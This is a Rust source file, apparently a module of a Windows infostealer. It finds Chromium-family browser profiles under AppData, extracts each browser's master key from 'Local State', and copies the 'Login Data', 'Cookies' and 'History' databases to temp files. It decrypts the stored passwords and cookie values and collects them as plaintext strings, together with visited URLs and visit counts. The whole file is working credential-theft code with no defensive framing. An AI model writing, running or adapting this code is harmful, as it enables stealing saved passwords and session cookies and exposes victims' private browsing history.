#[path = "constants.rs"]
mod constants;
#[path = "crypto.rs"]
mod crypto;
use rusqlite::{Connection, OpenFlags};
use std::{
    env,
    error::Error,
    fs::{self},
    path::{Path, PathBuf},
};
use uuid::Uuid;

fn get_user_data_dir(browser_dir: &PathBuf) -> Result<PathBuf, Box<dyn Error>> {
    let mut user_data_dir = browser_dir.to_owned();

    if !browser_dir.to_string_lossy().contains("Opera Software") {
        user_data_dir = user_data_dir.join("User Data");
    }
    return Ok(user_data_dir);
}

fn get_default_path(user_data_dir: &PathBuf) -> Result<PathBuf, Box<dyn Error>> {
    let mut login_data_path = user_data_dir.to_owned();

    if !user_data_dir.to_string_lossy().contains("Opera Software") {
        login_data_path = login_data_path.join("Default");
    }
    return Ok(login_data_path);
}

pub fn get_passwords() -> Result<Vec<String>, Box<dyn Error>> {
    let userprofile = env::var("USERPROFILE")?;
    let appdata_dir = Path::new(userprofile.as_str()).join("AppData");

    let mut passwords = Vec::new();

    for browser_target in constants::BROWSER_TARGETS.iter() {
        let browser_dir = appdata_dir.join(browser_target);

        if browser_dir.exists() {
            let user_data_dir = get_user_data_dir(&browser_dir)?;
            let local_state_path = user_data_dir.join("Local State");

            if local_state_path.exists() {
                if let Some(master_key) = crypto::get_master_key(&local_state_path) {
                    let default_path = get_default_path(&user_data_dir)?;
                    let login_data_path = default_path.join("Login Data");

                    if login_data_path.exists() {
                        let temp_env = std::env::temp_dir();

                        let temp_path = temp_env.join(Uuid::new_v4().to_string());
                        fs::copy(login_data_path, &temp_path)?;

                        let conn = Connection::open_with_flags(
                            &temp_path,
                            OpenFlags::SQLITE_OPEN_READ_ONLY,
                        )?;

                        let mut stmt = conn.prepare(
                            "SELECT origin_url, username_value, password_value FROM logins",
                        )?;

                        let mut rows = stmt.query([])?;

                        while let Some(row) = rows.next()? {
                            let origin_url: String = row.get(0)?;
                            let username: String = row.get(1)?;
                            let password = crypto::aes_decrypt(row.get(2)?, &master_key);

                            passwords.push(format!(
                                "URL: {}\nUsername: {}\nPassword: {}\n\n",
                                origin_url,
                                username,
                                std::str::from_utf8(&password)?
                            ));
                        }

                        drop(rows);
                        stmt.finalize()?;
                        conn.close().unwrap();
                        fs::remove_file(temp_path)?;
                    }
                }
            }
        }
    }
    return Ok(passwords);
}

pub fn get_cookies() -> Result<Vec<String>, Box<dyn Error>> {
    let userprofile = env::var("USERPROFILE")?;
    let appdata_dir = Path::new(userprofile.as_str()).join("AppData");

    let mut cookies = Vec::new();

    for browser_target in constants::BROWSER_TARGETS.iter() {
        let browser_dir = appdata_dir.join(browser_target);

        if browser_dir.exists() {
            let user_data_dir = get_user_data_dir(&browser_dir)?;
            let local_state_path = user_data_dir.join("Local State");

            if local_state_path.exists() {
                if let Some(master_key) = crypto::get_master_key(&local_state_path) {
                    let default_path = get_default_path(&user_data_dir)?;
                    let cookies_path = default_path.join("Network").join("Cookies");

                    if cookies_path.exists() {
                        let temp_env = std::env::temp_dir();

                        let temp_path = temp_env.join(Uuid::new_v4().to_string());
                        fs::copy(cookies_path, &temp_path)?;

                        let conn = Connection::open_with_flags(
                            &temp_path,
                            OpenFlags::SQLITE_OPEN_READ_ONLY,
                        )?;

                        let mut stmt =
                            conn.prepare("SELECT host_key, name, encrypted_value FROM cookies")?;

                        let mut rows = stmt.query([])?;

                        while let Some(row) = rows.next()? {
                            let host: String = row.get(0)?;
                            let name: String = row.get(1)?;
                            let value = crypto::aes_decrypt(row.get(2)?, &master_key);

                            cookies.push(format!(
                                "Host: {}\nName: {}\nValue: {}\n\n",
                                host,
                                name,
                                std::str::from_utf8(&value)?
                            ));
                        }

                        drop(rows);
                        stmt.finalize()?;
                        conn.close().unwrap();
                        fs::remove_file(temp_path)?;
                    }
                }
            }
        }
    }
    return Ok(cookies);
}

pub fn get_history() -> Result<Vec<String>, Box<dyn Error>> {
    let userprofile = env::var("USERPROFILE")?;
    let appdata_dir = Path::new(userprofile.as_str()).join("AppData");

    let mut history = Vec::new();

    for browser_target in constants::BROWSER_TARGETS.iter() {
        let browser_dir = appdata_dir.join(browser_target);

        if browser_dir.exists() {
            let user_data_dir = get_user_data_dir(&browser_dir)?;
            let default_path = get_default_path(&user_data_dir)?;
            let history_path = default_path.join("History");

            if history_path.exists() {
                let temp_env = std::env::temp_dir();

                let temp_path = temp_env.join(Uuid::new_v4().to_string());
                fs::copy(history_path, &temp_path)?;

                let conn =
                    Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY)?;

                let mut stmt = conn.prepare("SELECT title, url, visit_count FROM urls")?;
                let mut rows = stmt.query([])?;

                while let Some(row) = rows.next()? {
                    let title: String = row.get(0)?;
                    let url: String = row.get(1)?;
                    let visit_count: u32 = row.get(2)?;

                    history.push(format!(
                        "URL: {}\nTitle: {}\nVisit count: {}\n\n",
                        url, title, visit_count
                    ));
                }

                drop(rows);
                stmt.finalize()?;
                conn.close().unwrap();
                fs::remove_file(temp_path)?;
            }
        }
    }
    return Ok(history);
}
